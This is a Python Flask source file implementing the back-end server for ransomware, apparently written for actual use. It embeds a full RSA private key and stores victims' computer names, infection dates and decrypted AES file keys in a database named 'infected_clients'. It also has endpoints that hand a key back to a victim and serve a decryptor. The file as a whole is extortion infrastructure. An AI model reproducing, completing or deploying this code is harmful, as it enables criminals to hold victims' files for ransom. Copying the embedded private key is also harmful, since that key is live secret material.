from re import A
from attr import dataclass
from flask import redirect, request, Response, send_from_directory, Flask
from Crypto.Cipher import PKCS1_OAEP
import mysql.connector

from utils import decrypt_aes_key
server=Flask(__name__)

privkey="""-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

cipher=PKCS1_OAEP.new(privkey)

DECRYPTOR_PATH=""
DB_PASSWD=""


db=mysql.connector.connect(host="localhost", db="infected_clients", user="root", passwd=DB_PASSWD)
cursor=db.cursor()



@server.route("/accept-client", methods=['POST'])
def accept_client():
    data=request.json

    
    enckey=data['KEY']
    cname=data['CNAME']
    infdate=data['INFDATE']
    key=decrypt_aes_key(enckey, privkey)
    
    try:
        cursor.execute("INSERT INTO `clients` (`computername`, `deckey`, `infdate`) VALUES (%s, %s, %s)", (cname, key, infdate))
        db.commit()
        return Response(response="yes", status=200)
    except:
        return Response(response="no", status=500)



@server.route("/decrypt", methods=['POST'])
def decrypt():

    data = request.json

    deckey=data["KEY"]
    cname=data["CNAME"]


    cursor.execute("SELECT * FROM `clients` WHERE `computername`=%s AND `deckey`=%s",(cname, deckey))
    if cursor.fetchone() is not None:
            if decrypt_aes_key(deckey, privkey):
                return Response(deckey, status=200)
            else:
                return Response(status=404)
    else:
        return Response(status=404)


@server.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    return send_from_directory(DECRYPTOR_PATH)




@server.errorhandler(404)
def page_not_found(error):
	return Response("resource not found", status=404)

@server.errorhandler(500)
def internal_error(error):
	return Response("internal server error", status=404)


@server.route("/")
def home():
    return ''

if __name__ == '__main__':

    port = 8000
    host = '127.0.0.1'
    server.run(host=host, port=port)